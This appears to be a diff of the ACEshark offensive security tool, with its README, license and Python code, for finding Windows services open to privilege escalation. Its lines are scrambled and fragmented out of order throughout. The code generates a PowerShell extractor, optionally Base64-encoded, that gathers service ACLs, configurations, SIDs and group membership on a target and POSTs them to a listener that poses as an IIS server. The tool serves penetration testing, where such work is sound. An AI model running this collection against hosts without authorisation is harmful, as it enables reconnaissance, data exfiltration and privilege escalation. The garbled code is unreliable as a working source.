@@ -1,0 +1,662 @@
+     
+                        ACEshark creates log files every time you run the extractor script on a machine (stored in 
+                        Change the delimiter value used for service config serialization (default: 
+                        Change the temporary filename used to store the extracted services configuration before transferring the data via HTTP (default: sc.txt).
+                        Optional: Path to the TLS certificate for enabling HTTPS.
+                        Optional: Path to the private key for the TLS certificate.
+                        Similar to --interesting-only but with stricter criteria. A service is labeled as a great candidate for privilege escalation if the service's START_TYPE == DEMAND_START AND TYPE ==
+                        WIN32_OWN_PROCESS AND your user has (WRITE_PROPERTY AND CONTROL_ACCESS) OR GENERIC_ALL privileges.
+                        Your server IP or domain name. This option cannot be used with -f.
+                        option cannot be used with -s.
+                        privileges.
+     by t3l3machus
+   and/or other materials provided with the distribution.
+   list of conditions and the following disclaimer.
+   this list of conditions and the following disclaimer in the documentation
+ $d=Get-Content -Path $f -Raw
+ $x=(sc.exe qc $_.Name 
+ $x=(sc.exe qc $_.PSChildName 
+ % {{ $c=sc.exe sdshow $_.Name
+ % {{ $c=sc.exe sdshow $_.PSChildName
+ -------------- Arguments -------------- 
+ 1:]
+ ACCESS_DENIED
+ ACE object types
+ ACEshark
+ Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value))
+ Add-Content -Path $f -Value ((whoami /groups) 
+ Author: Panagiotis Chartas (t3l3machus)
+ Check if both cert and key files were provided
+ Check if hostname is resolvable
+ Check if user has any rights on the service
+ Check if valid IP address
+ Check if valid hostname
+ Extract service config values
+ Extractor Script Templates
+ Get-Service 
+ Global
+ Highlight interesting
+ How it works
+ Initialize the ACE parser
+ Installation
+ Mode selection control
+ OR BUSINESS INTERRUPTION) HOWEVER
+ Overview
+ Services config source control
+ Special Thanks
+ Standard accounts
+ Strip trailing dot (used to indicate an absolute domain name and technically valid according to DNS standards)
+ Usage
+ Using Get-ChildItem to list services (default - More likely to work with a low-privileged account).
+ What is it
+ Why
+ args.audit 
+ args.great_candidates 
+ base64.b64encode(payload.encode('utf16')[2:]).decode()
+ charset=UTF-8')
+ custom_mode) == 0:
+ custom_mode) > 1:
+ data=
+ del $f'
+ https://github.com/t3l3machus
+ of a service and restarting it).  
+ or 
+ or other non-native binaries.
+ user_sid
+!/usr/bin/env python3
+!ACEshark_log')
+!ACEshark_log':
+![aceshark2](https://github.com/user-attachments/assets/09789877-665d-476a-8c2c-a86000380614)
+![image](https://github.com/user-attachments/assets/e292d618-1aa2-4431-953f-96c9a888e2a5)
+"                        List only those service ACEs that can potentially be abused by your user, based on their SID and group membership, with at least (WRITE_PROPERTY AND CONTROL_ACCESS) or GENERIC_ALL"
+"                        Provide a comma-separated list of integers representing the generic access rights to match. Only service ACEs that your user may be able to abuse, based on their SID and group"
+"                        approach, though less elegant, is more likely to succeed in most cases."
+"                        membership matching the provided rights, will be listed. Use -lg to list all predefined generic access rights."
+"                        the current user's SID and group membership information. By default, the WRITE_PROPERTY and CONTROL_ACCESS rights are highlighted for simplicity when they are present."
+"  -a, --audit           Audit mode. Analyzes all service ACEs without searching for user-specific abusable services (Long output). This option also downgrades the extractor script, omitting the retrieval of"
+"  -c CERTFILE, --certfile CERTFILE"
+"  -d DELIMITER, --delimiter DELIMITER"
+"  -e, --encode          Generate Base64-encoded services configuration extractor script instead of raw PowerShell."
+"  -f FILE_INPUT, --file-input FILE_INPUT"
+"  -g, --great-candidates"
+"  -gs, --get-service    This option modifies the extractor script to use Get-Service for listing available services. While cleaner, it may not work with a low-privileged account. The default Get-ChildItem"
+"  -h, --help            show this help message and exit"
+"  -i, --interesting-only"
+"  -k KEYFILE, --keyfile KEYFILE"
+"  -lg, --list-generic   List all predefined generic access rights."
+"  -p PORT, --port PORT  HTTP / HTTPS server port (default: 80 / 443)."
+"  -q, --quiet           Do not print the banner on startup."
+"  -s SERVER_ADDRESS, --server-address SERVER_ADDRESS"
+"  -v, --verbose         Print the user's SID and group membership info as well (not applicable in Audit mode)."
+"  -x CUSTOM_MODE, --custom-mode CUSTOM_MODE"
+"  -z CONFIG_FILENAME, --config-filename CONFIG_FILENAME"
+" ""</groups>"")"
+" -> STR LIST rights, BOOL full_control, INT LIST rights"
+" Add-Content -Path $f -Value ""$($_.Name)::$x"
+" Add-Content -Path $f -Value ""$($_.PSChildName)::$x"
+" ForEach-Object {{ $_.Trim() }}) -join ""{DELIMITER}"""
+" GENERIC_ALL, SERVICE_ALL_ACCESS "
+" Get-ChildItem -Path ""HKLM:"
+" IRM -Uri ""{""http"" if not tls else ""https""}://{server_address}:{port}/{POST_DATA_ENDPOINT}"" -Method POST -Body @{{data=$d}}"
+" LOSS OF USE, DATA, OR PROFITS"
+" Set-Content -Path $f -Value """""
+" Using Get-Service to list services (Cleaner, but won't work with a low-privileged account)."
+"""), "".ACEshark"")"
+""", help = ""Change the delimiter value used for service config serialization (default: "
+"""AO"": ""Account Operators"","
+"""AU"": ""Authenticated Users"","
+"""BA"": ""Built-in Administrators"","
+"""BG"": ""Built-in Guests"","
+"""BO"": ""Backup Operators"","
+"""BU"": ""Built-in Users"","
+"""CA"": ""Certificate Server Administrators"","
+"""CG"": ""Creator Group"","
+"""CO"": ""Creator Owner"","
+"""DA"": ""Domain Administrators"","
+"""DC"": ""Domain Computers"","
+"""DD"": ""Domain Controllers"","
+"""DG"": ""Domain Guests"","
+"""DU"": ""Domain Users"","
+"""EA"": ""Enterprise Administrators"","
+"""ED"": ""Enterprise Domain Controllers"","
+"""IU"": ""Interactive Users"","
+"""LA"": ""Local Administrator"","
+"""LG"": ""Local Guest"","
+"""LS"": ""Local Service"","
+"""LU"": ""Network Logon User"","
+"""MO"": ""Creator Owner Server"","
+"""MU"": ""Creator Group Server"","
+"""NO"": ""Network Configuration Operators"","
+"""NS"": ""Network Service"","
+"""NU"": ""Network"","
+"""OW"": ""Owner Rights"","
+"""PO"": ""Print Operators"","
+"""PS"": ""Personal Self"","
+"""PU"": ""Power Users"","
+"""RC"": ""Restricted Code"","
+"""RE"": ""Replicator"""
+"""RE"": ""Restricted Network"","
+"""RO"": ""Replica Server Operators"","
+"""RU"": ""Alias to allow previous Windows 2000"","
+"""SA"": ""Schema Administrators"","
+"""SI"": ""System"","
+"""SO"": ""Server Operators"","
+"""SU"": ""Service Logon User"","
+"""SY"": ""Local System"","
+"""UI"": ""NTLM Authentication"","
+"""VA"": ""Virtual Account"","
+"""WD"": ""Everyone"","
+"""WG"": ""Windows Authorization Access Group"","
+"""WO"": ""Well-known group object"","
+"""WR"": ""World Access Group"","
+"""YS"": ""Terminal Server Users"","
+"', ""utf-8""))"
+"', ' ')"
+"', ' ').strip()"
+"', ' ', name)"
+"', ' ', val)"
+"'s a great PE candidate, other Windows security features may still block its abuse.')"
+")', aces)"
+"). Use this option cautiously. It is rarely needed."", type = str)"
+"- Marios K. Pappas (aka [Pri3st](https://www.github.com/Pri3st)), for helping test the tool!"
+"- [TJ_Null](https://x.com/TJ_Null), for testing and providing valuable feedback!"
+"/.ACEshark). Use this option to regenerate a services config analysis from a log file. This option cannot be used with -s."", type = str)"
+"0: ""ACCESS_ALLOWED"","
+"1. Even if a service is characterized as a great candidate for privilege escalation according to its ACEs and configuration, there are other Windows security features that may prevent you from actually abusing it."
+"1. Redistributions of source code must retain the above copyright notice, this"
+"1048576: ""SYNCHRONIZE"","
+"1073741824: ""GENERIC_WRITE"","
+"10: ""ACCESS_DENIED_CALLBACK"","
+"11: ""ACCESS_ALLOWED_CALLBACK_OBJECT"","
+"128: ""LIST_OBJECT"","
+"131072: ""READ_CONTROL"","
+"13: ""SYSTEM_AUDIT_CALLBACK"","
+"16: ""READ_PROPERTY"","
+"17: ""SYSTEM_MANDATORY_LABEL"","
+"18: ""SYSTEM_RESOURCE_ATTRIBUTE"","
+"19: ""SYSTEM_SCOPED_POLICY_ID"","
+"1: ""ACCESS_DENIED"","
+"1: ""CREATE_CHILD"","
+"2. Redistributions in binary form must reproduce the above copyright notice,"
+"2031616: ""STANDARD_RIGHTS_ALL"","
+"20: ""SYSTEM_PROCESS_TRUST_LABEL"","
+"2147483648: ""GENERIC_READ"""
+"21: ""SYSTEM_ACCESS_FILTER"""
+"256: ""CONTROL_ACCESS"","
+"262144: ""WRITE_DAC"","
+"268435456: ""GENERIC_ALL"","
+"2: ""DELETE_CHILD"","
+"32: ""WRITE_PROPERTY"","
+"4: ""LIST_CHILDREN"","
+"524288: ""WRITE_OWNER"","
+"536870912: ""GENERIC_EXECUTE"","
+"5: ""ACCESS_ALLOWED_OBJECT"","
+"64: ""DELETE_TREE"","
+"65536: ""STANDARD_DELETE"","
+"6: ""ACCESS_DENIED_OBJECT"","
+"7: ""SYSTEM_AUDIT_OBJECT"","
+"8: ""SELF_WRITE"","
+"8: ""SYSTEM_ALARM_OBJECT"","
+"983040 : ""STANDARD_RIGHTS_REQUIRED"","
+"983551: ""SERVICE_ALL_ACCESS"","
+"9: ""ACCESS_ALLOWED_CALLBACK"","
+": If automatic copy to clipboard of the extractor script fails, you may need to install a copy/paste mechanism, like "
+"<img src=""https://img.shields.io/badge/Developed%20on-kali%20linux-blueviolet"">"
+"<img src=""https://img.shields.io/badge/Experimental-ff0000"">"
+"<img src=""https://img.shields.io/badge/Maintained%3F-Yes-96c40f"">"
+"<img src=""https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue"">"
+"ACEshark generates a log file for each extracted services configuration, allowing reports to be regenerated if needed."
+"ACEshark is a utility designed for rapid extraction and analysis of Windows service configurations and Access Control Entries, eliminating the need for tools like "
+"ACEshark is a utility designed for rapid extraction and analysis of Windows service configurations and Access Control Entries, eliminating the need for tools like accesschk.exe or other non-native binaries."
+"ACEshark_logs_dir = os.path.join(os.path.expanduser("""
+"AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE"
+"Add-Content -Path $f -Value ""$($_.Name)::$x"
+"Add-Content -Path $f -Value ""$($_.PSChildName)::$x"
+"CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,"
+"Copyright (c) 2024, Panagiotis Chartas (t3l3machus)"
+"DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR"
+"FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL"
+"GC_audit_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, ""{SRVS_CONF_FILENAME}"")"
+"GC_pe_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, ""{SRVS_CONF_FILENAME}"")"
+"GS_audit_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, ""{SRVS_CONF_FILENAME}"")"
+"GS_pe_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, ""{SRVS_CONF_FILENAME}"")"
+"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+"Redistribution and use in source and binary forms, with or without"
+"Running ACEshark starts an HTTP/HTTPS server to act as a listener for service configurations and Access Control Entries. It generates a small extractor script based on the specified options, which the user runs on the target machine. ACEshark then retrieves and processes the data, providing a detailed analysis."
+"Services"" "
+"System', 'NT AUTHORITY"
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"""
+"Thread(target = httpd.serve_forever, args = (), daemon=True).start()"
+"audit_services_config(url_decoded_data_l, client_addr)"
+"basic_group.add_argument(""-c"", ""--certfile"", action=""store"", help=""Optional: Path to the TLS certificate for enabling HTTPS."")"
+"basic_group.add_argument(""-f"", ""--file-input"", action=""store"", help = ""ACEshark creates log files every time you run the extractor script on a machine (stored in "
+"basic_group.add_argument(""-k"", ""--keyfile"", action=""store"", help=""Optional: Path to the private key for the TLS certificate."")"
+"basic_group.add_argument(""-p"", ""--port"", action=""store"", help=""HTTP / HTTPS server port (default: 80 / 443)."", type=valid_port, default=None)"
+"basic_group.add_argument(""-s"", ""--server-address"", action=""store"", help = ""Your server IP or domain name. This option cannot be used with -f."", type = str)"
+"c_types = ['TYPE', 'START_TYPE', 'BINARY_PATH_NAME', 'SERVICE_START_NAME']"
+"config_l = c_str.split(f""{DELIMITER}"")"
+"context.load_cert_chain(certfile = args.certfile, keyfile = args.keyfile)"
+"custom_rights = args.custom_mode.split(',')"
+"d-]"", re.IGNORECASE)"
+"decoded_data = post_data.decode('utf-8', 'ignore')"
+"def audit_services_config(url_decoded_data_l, client_addr = False):"
+"def extract_object_name(sid, user_groups):"
+"def write_to_timestamped_file(content, client_addr):"
+"description=""ACEshark is a utility designed for rapid extraction and analysis of Windows service configurations and Access Control Entries, eliminating the need for tools like accesschk.exe or other non-native binaries."""
+"disallowed = re.compile(r""["
+"enc_payload = ""powershell -e "" "
+"exit(f'{DEBUG} This log was generated in Audit mode and cannot be used for service analysis in -i (--interesting-only), -x (--custom-mode), or -g (--great-candidates) modes. FYI, the opposite is possible.')"
+"extractor_group.add_argument(""-d"", ""--delimiter"", action=""store"", default="""
+"extractor_group.add_argument(""-e"", ""--encode"", action=""store_true"", help = ""Generate Base64-encoded services configuration extractor script instead of raw PowerShell."")"
+"extractor_group.add_argument(""-gs"", ""--get-service"", action=""store_true"", help = ""This option modifies the extractor script to use Get-Service for listing available services. While cleaner, it may not work with a low-privileged account. The default Get-ChildItem approach, though less elegant, is more likely to succeed in most cases."")"
+"extractor_group.add_argument(""-z"", ""--config-filename"", action=""store"", default=""sc.txt"", help = ""Change the temporary filename used to store the extracted services configuration before transferring the data via HTTP (default: sc.txt)."", type = str)"
+"file_name = f""{client_addr}_{timestamp}.ACEshark.log"""
+"file_path = os.path.join(ACEshark_logs_dir, file_name)"
+"for i in range(0, len(services_config) - 1, 2):"
+"for key, val in generic_access_rights.items():"
+"for key, val in {'--port': args.port, '--certfile': args.certfile, '--keyfile': args.keyfile}.items():"
+"from http.server import HTTPServer, BaseHTTPRequestHandler"
+"global FIN, target_generic_rights"
+"httpd = HTTPServer(('0.0.0.0', port), _HttpServer)"
+"httpd.socket = context.wrap_socket(sock = httpd.socket, server_side= True)"
+"if addr[-1] == ""."":"
+"if all(len(part) and not part.startswith(""-"") and not part.endswith(""-"") and not disallowed.search(part) for part in addr.split(""."")):"
+"if args.audit or (re.search(f'{sid_val} ', user_groups) or sid_val.upper() == user_sid.upper().strip()):"
+"if c in ['TYPE', 'START_TYPE']:"
+"if getattr(args, action.dest) != action.default"
+"if isinstance(sid, str):"
+"if re.search('OpenService FAILED', stat):"
+"if user_account.strip() in ['LocalSystem', 'NT"
+"if val in [268435456, 983551]: "
+"import re, urllib.parse, argparse, base64, os, ssl, socket"
+"modes_group.add_argument(""-a"", ""--audit"", action=""store_true"", help = ""Audit mode. Analyzes all service ACEs without searching for user-specific abusable services (Long output). This option also downgrades the extractor script, omitting the retrieval of the current user's SID and group membership information. By default, the WRITE_PROPERTY and CONTROL_ACCESS rights are highlighted for simplicity when they are present. "")"
+"modes_group.add_argument(""-g"", ""--great-candidates"", action=""store_true"", help = ""Similar to --interesting-only but with stricter criteria. A service is labeled as a great candidate for privilege escalation if the service's START_TYPE == DEMAND_START AND TYPE == WIN32_OWN_PROCESS AND your user has (WRITE_PROPERTY AND CONTROL_ACCESS) OR GENERIC_ALL privileges."")"
+"modes_group.add_argument(""-i"", ""--interesting-only"", action=""store_true"", help = ""List only those service ACEs that can potentially be abused by your user, based on their SID and group membership, with at least (WRITE_PROPERTY AND CONTROL_ACCESS) or GENERIC_ALL privileges."")"
+"modes_group.add_argument(""-lg"", ""--list-generic"", action=""store_true"", help = ""List all predefined generic access rights."")"
+"modes_group.add_argument(""-x"", ""--custom-mode"", action=""store"", help = ""Provide a comma-separated list of integers representing the generic access rights to match. Only service ACEs that your user may be able to abuse, based on their SID and group membership matching the provided rights, will be listed. Use -lg to list all predefined generic access rights."", type = str)"
+"modification, are permitted provided that the following conditions are met:"
+"n   -a, --audit"
+"n   -g, --great-candidates"
+"n   -i, --interesting-only"
+"n   -x, --custom-mode')"
+"n$c"" }}"
+"n', 1)[1]"
+"n'.join(url_decoded_data_l), client_addr)"
+"n{DEBUG} Only one option can be used: -s, --server-address or -f, --file input')"
+"n{DEBUG} You must specify either -s, --server-address or -f, --file input.')"
+"n{INFO} Waiting for script execution on the target, be patient...')"
+"obj_name = extract_object_name(sid, user_groups) if not wellknown and legit_sid else ''"
+"output_group.add_argument(""-q"", ""--quiet"", action=""store_true"", help = ""Do not print the banner on startup."")"
+"output_group.add_argument(""-v"", ""--verbose"", action=""store_true"", help = ""Print the user's SID and group membership info as well (not applicable in Audit mode)."")"
+"print(f""{ERR} Failed to read file {file_path}: {e}"")"
+"print(f""{ERR} The file at {file_path} was not found."")"
+"print(f""{INFO} Configuration captured in {ORNG}{file_path}{RST} - You can use this file to regenerate the services config analysis if required (-f)."")"
+"print(f'          {ORNG}Potentially Abusable{"" - Great Candidate"" if great_candidate else """"}!{RST}') if interesting_or_abusable else do_nothing()"
+"print(f'{IMP} If your TLS certificate is untrusted, you"
+"print(f'{INFO} Http server started. Try {ORNG}{""http"" if not tls else ""https""}://{args.server_address}:{port}/{DEBUG_ENDPOINT}{RST} if you wish to check if reachable.')"
+"raise argparse.ArgumentTypeError(f""Port number must be between 1 and 65535, got {port}."")"
+"reason = config_dict['reason'].strip("":"")"
+"return [mode, content]"
+"return [rights_str, full_control, rights_int] "
+"return [user_groups, c]"
+"return {'status': 0, 'reason': stat.split('FAILED ')[1]}"
+"self.send_header('Access-Control-Allow-Origin', '"
+"self.send_header('Content-Type', 'text/plain')"
+"self.send_header('Content-type', 'text/javascript"
+"self.server_version = ""Microsoft-IIS/10"""
+"self.sys_version = """""
+"target_gen_access_rights = [32, 256, 536870912, 1073741824] if not target_generic_rights else target_generic_rights"
+"target_gen_access_rights = [32, 256] if not args.custom_mode else target_generic_rights"
+"timestamp = datetime.now().strftime(""%Y%m%d_%H%M%S"")"
+"tmp = services_config[i].split(""::"")"
+"url_decoded_data_l.insert(0, '"
+"url_decoded_data_l.insert(0, 'audit' if args.audit else 'pe')"
+"url_decoded_data_l.insert(0, user_sid)"
+"user_sid, user_groups = '', ''"
+"val = line.split("":"", 1)[1]"
+"val = val.split(' ', 1)[1]"
+"with open(file_path, 'r') as file:"
+"with open(file_path, 'w') as file:"
+''' Colors '''
+''')
+')[1]
+'ll have to bypass certificate validation for this to work.') if tls else do_nothing()
+'s ACEs suggest it
+'t appear to be an ACEshark log file.')
+([0-9A-Za-z
+). Use this option cautiously. It is rarely needed.
+- Audit service permissions for specific users or across all groups and accounts.
+- Efficiently identify and analyze service permissions to uncover potential privilege escalation vectors (changing the 
+/.ACEshark). Use this option to regenerate a services config analysis from a log file. This
+033[0
+033[0m'
+033[1
+033[1m'
+033[38
+1. Clone the repository:
+12m'
+141m'
+2. Install dependencies:
+2. This is probably not going to be particularly stealthy.
+201m'
+214m'
+3. Using this tool against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using this tool.
+31m'
+50m'
+82m'
+ACEshark.py [-h] [-s SERVER_ADDRESS] [-p PORT] [-c CERTFILE] [-k KEYFILE] [-f FILE_INPUT] [-i] [-g] [-a] [-x CUSTOM_MODE] [-lg] [-gs] [-e] [-z CONFIG_FILENAME] [-d DELIMITER] [-q] [-v]
+AUTHORITY
+BASIC OPTIONS:
+BLUE = '
+BOLD = '
+BSD 2-Clause License
+CurrentControlSet
+DEBUG = f'[{ORNG}Debug{RST}]'
+DEBUG_ENDPOINT = '_debug_'
+DELIMITER = args.delimiter
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+ERR = f'[{RED}Error{RST}]'
+EXTRACTOR MODIFICATIONS:
+FIN = False
+FIN = True
+GREEN = '
+IMP = f'[{ORNG}Important{RST}]'
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+INFO = f'[{MAIN}Info{RST}]'
+INPUT = f'[{ORNG}Input{RST}]'
+Important
+LPURPLE = '
+MAIN = '
+MODES:
+Note
+OOPS = f'[{RED}Oops!{RST}]'
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+ORANGEB = '
+ORNG = '
+OUTPUT:
+PL = f'{GREEN}
+POST_DATA_ENDPOINT = 'ACEshark'
+PURPLE = '
+RED = '
+RST = '
+SERVICES
+SRVS_CONF_FILENAME = args.config_filename
+SYSTEM
+System']:
+[![License](https://img.shields.io/badge/License-BSD-red.svg)](https://github.com/t3l3machus/ACEshark/blob/main/LICENSE)
+[![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.12-yellow.svg)](https://www.python.org/) 
+accesschk.exe
+ace = parse_ace(item)
+ace_target = ''
+ace_target = well_known_sids[obj_id.upper()]
+ace_type = ace.type.value
+ace_type = ace_types[ace_type]
+ace_types = {
+aces = services_config[i 
+aces_list = re.findall('
+action.dest for action in extractor_group._group_actions
+active_template = (GC_audit_template if mode == 'audit' else GC_pe_template) if not args.get_service else (GS_audit_template if mode == 'audit' else GS_pe_template)
+active_template = encodeExtractor(active_template) if args.encode else active_template
+addr = addr[:-1]  
+addr_verified = False
+addr_verified = addr
+addr_verified = str(ip_address(addr))
+args = parser.parse_args()
+audit_services_config(data)
+audit_services_config(url_decoded_data_l)
+basic_group = parser.add_argument_group('BASIC OPTIONS')
+binpath
+binpath = config_dict['BINARY_PATH_NAME']
+break
+c = 0
+c = tmp[1]
+c_types.remove(c)
+cd ACEshark  
+class _HttpServer(BaseHTTPRequestHandler):
+client_addr = 'null_client'
+client_addr = self.client_address[0]
+config = tmp[1].strip()
+config_dict = extract_config(config)
+config_dict = {'status': 1}
+config_dict[c] = 'UNDISCLOSED'
+config_dict[c] = val
+config_l = [l.strip() for l in config_l]
+content = file.read().splitlines()
+content_len = int(self.headers.get('Content-Length'))
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+continue
+copy2cb(active_template)
+create_ACEshark_log_folder()
+custom_mode = True if args.custom_mode else False
+custom_rights = [r.strip() for r in custom_rights if r.strip()]
+data = log[1]
+data.pop(0) 
+def create_ACEshark_log_folder():
+def do_GET(self):
+def do_POST(self):
+def do_nothing():
+def encodeExtractor(payload):
+def extractGroups(url_decoded_data_l):
+def extract_config(c_str):
+def extract_rights(ace):
+def main():
+def print_banner():
+def read_file_to_list(file_path):
+def valid_port(value):
+def validate_host_address(addr):
+display_rights = 'None' if not rights_detailed[0] else '
+elif (args.interesting_only 
+elif args.certfile and args.keyfile:
+elif args.server_address and args.file_input:
+elif mode == 'audit':
+elif mode == 'pe' and (mode == log_mode):
+elif val in target_gen_access_rights: 
+else:
+except Exception as e:
+except FileNotFoundError:
+except IOError as e:
+except KeyError:
+except KeyboardInterrupt:
+except OSError:
+except ValueError:
+except:
+exit()
+exit() if not log else do_nothing()
+exit(f'
+exit(f'[{DEBUG}] TLS implementation failed: {e}.
+exit(f'{DEBUG} Int value {i} not in predefined generic access rights. Feel free to submit a pull request if you believe something is missing.')
+exit(f'{DEBUG} Invalid generic access rights value. Please check your input and try again.')
+exit(f'{DEBUG} Server address is not resolvable. Check input and try again.') if not valid_addr else do_nothing()
+exit(f'{DEBUG} TLS support seems to be misconfigured (missing key or cert file).')
+exit(f'{ERR} Port {port} seems to already be in use.
+exit(f'{OOPS} Something went really wrong: {e}')
+extractor_args = [
+extractor_group = parser.add_argument_group('EXTRACTOR MODIFICATIONS')
+file.write(content)
+for c in c_types:
+for i in target_gen_access_rights:
+for item in aces_list:
+for l in url_decoded_data_l:
+for line in config_l:
+for r in ace.rights:
+for r in custom_rights:
+for val in extractor_args:
+from datetime import datetime
+from ipaddress import ip_address
+from pyperclip import copy as copy2cb
+from sddl_parser import parse_ace
+from threading import Thread
+from time import sleep
+full_control = False
+full_control = True
+generic_access_rights = {
+git clone https://github.com/t3l3machus/ACEshark
+global active_template
+global target_generic_rights
+great_candidate = False
+great_candidate = True if (member and interesting_or_abusable and not args.custom_mode and service_type == 'WIN32_OWN_PROCESS' and start_type == 'DEMAND_START') else False
+great_candidate = True if rights_detailed[1] or (service_type == 'WIN32_OWN_PROCESS' and start_type == 'DEMAND_START') else False
+i = int(r)
+if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):
+if (args.interesting_only 
+if (mode == 'pe' and log_mode == 'audit'):
+if __name__ == '__main__':
+if ace_type == 1 and mode == 'pe': 
+if ace_type in ace_types.keys():
+if args.audit or (((member and interesting_or_abusable and (args.interesting_only or args.custom_mode)) or (args.great_candidates and great_candidate))):
+if args.custom_mode:
+if args.file_input:
+if args.list_generic:
+if c_types:
+if i not in generic_access_rights.keys():
+if i not in rights_detailed[2]:
+if l.strip() == '</groups>':
+if len(addr) > 255:
+if len(obj_id) == 2:
+if line.startswith(c):
+if log_mode == 'pe':
+if not args.audit and not args.custom_mode:
+if not args.audit:
+if not args.file_input:
+if not args.list_generic:
+if not args.server_address and not args.file_input:
+if not config_dict['status']:
+if not custom_rights:
+if not os.path.exists(ACEshark_logs_dir):
+if not rights_detailed[0]:
+if obj_name:
+if port < 1 or port > 65535:
+if r.value in generic_access_rights.keys():
+if self.path == f'/{DEBUG_ENDPOINT}':
+if self.path == f'/{POST_DATA_ENDPOINT}':
+if signature != '
+if tls:
+interesting_or_abusable = False
+interesting_or_abusable = True
+legit_sid = sid_val.startswith('S')
+log = read_file_to_list(args.file_input)
+log_mode = log[0]
+main()
+member = False
+member = True
+mode = 'audit' if args.audit else 'pe'
+mode = content.pop(0).strip()
+modes_group = parser.add_argument_group('MODES')
+n                  '.join(rights_detailed[0])
+n {user_groups}') if (args.verbose and not args.audit) else do_nothing()
+n'.join(tmp[0]).replace('
+name = re.sub(r'
+name = tmp.rsplit('
+n{DEBUG} A single mode can be used at a time:
+n{DEBUG} Select a mode:
+obj_id = item.strip('()').rsplit('
+options:
+os.makedirs(ACEshark_logs_dir)
+output_group = parser.add_argument_group('OUTPUT')
+parser = argparse.ArgumentParser(
+pass
+pip3 install -r requirements.txt  
+port = args.port if args.port else (443 if tls else 80)
+port = int(value)
+post_data = self.rfile.read(content_len)
+print('''
+print()
+print() if c == 0 else do_nothing()
+print(f'
+print(f'          ACE Type: {BOLD}{ace_type}{RST}')
+print(f'          Binary Path: {binpath}')
+print(f'          Rights: {display_rights}')
+print(f'          User / Group: {BOLD}{BLUE}{obj_name}{RST} ({sid_val})')
+print(f'          User / Group: {BOLD}{sid}{RST}' if sid_val == sid else f'          User / Group: {BOLD}{sid}{RST} ({sid_val})')
+print(f'          {RED}Running as SYSTEM{RST}') if interesting_or_abusable else do_nothing()
+print(f'      [{PL}] Analyzing ACE {item}')
+print(f' {key} : {val}')
+print(f'[{ORNG}User Groups{RST}]
+print(f'[{ORNG}User SID{RST}] {user_sid}') if args.verbose else do_nothing()
+print(f'{BOLD}[{LPURPLE}{service}{RST}][{service_type}][{start_type}] Running as user: {BOLD}{user_account}{RST}')
+print(f'{BOLD}[{RED}{service}{RST}] Service config query failed. Error Code: {reason}')
+print(f'{DEBUG} Hostname length greater than 255 characters.')
+print(f'{DEBUG} This doesn
+print(f'{ERR} Failed to create logs dir {ACEshark_logs_dir}.')
+print(f'{ERR} Failed to write services configuration to a file: {e} - Moving on.')
+print(f'{ERR} {e}')
+print(f'{GREEN}{active_template}{RST}') 
+print(f'{IMP} Even if a service
+print(f'{INFO} Data retrieved! Processing...')
+print(f'{INFO} Done.')
+print(f'{INFO} Ignoring argument --{val}.')
+print(f'{INFO} Ignoring argument {key}.') if val else do_nothing()
+print(f'{INFO} Initiating services audit.')
+print(f'{INFO} Run the following extractor script (or similar) on the target machine to retrieve the configuration of all services:')
+print(f'{ORNG}Copied to clipboard!{RST}')
+print(f'{RED}Copy to clipboard failed. Please do it manually.{RST}')
+print_banner() if not args.quiet else do_nothing()
+pyperclip
+raise
+re all set.
+return
+return ''
+return False
+return []
+return addr_verified
+return config_dict
+return enc_payload
+return name.strip()
+return port
+rights_detailed = extract_rights(ace) 
+rights_int = []
+rights_int.append(val)
+rights_str = []
+rights_str.append(f'{GREEN}{generic_access_rights[r.value]}{RST}')
+rights_str.append(f'{RED}{generic_access_rights[r.value]}{RST}')
+rights_str.append(f'{RED}{r.value}{RST}')
+rights_str.append(generic_access_rights[r.value])
+sddl_parser
+self.end_headers()
+self.send_response(200)
+self.wfile.write(b'OK')
+self.wfile.write(bytes('It works! Who would have thought
+server_address = args.server_address
+service = tmp[0].replace('
+service_type = config_dict['TYPE']
+services_config = url_decoded_data_l
+services_config = url_decoded_data_l[c 
+sid = ace.sid
+sid = ace_target if legit_sid and ace_target else sid
+sid_val = sid
+sid_val = sid.value
+signature = content.pop(0).strip()
+sleep(1)
+socket.gethostbyname(addr)
+start_type = config_dict['START_TYPE']
+stat = config_l[0].replace('
+sudo apt-get install xclip
+sudo apt-get install xselect
+target_generic_rights = []
+target_generic_rights.append(i)
+tls = False
+tls = True
+tmp = extractGroups(data)
+tmp = extractGroups(url_decoded_data_l)
+tmp = user_groups.split(sid)[0]
+try:
+url_decoded_data = urllib.parse.unquote(decoded_data).strip()
+url_decoded_data_l = data[c 
+url_decoded_data_l = url_decoded_data.split('
+url_decoded_data_l.pop(0) 
+user_account = config_dict['SERVICE_START_NAME']
+user_groups = '
+user_groups = []
+user_groups.append(l)
+user_sid = url_decoded_data_l.pop(0)
+val = ''
+val = 'UNDISCLOSED' if not val.strip() else val
+val = r.value
+val = re.sub(r'
+val = val.replace('
+valid_addr = validate_host_address(args.server_address)
+well_known_sids = {
+wellknown = True if ace_target else False
+while not FIN:
+write_to_timestamped_file('
+{RST}'
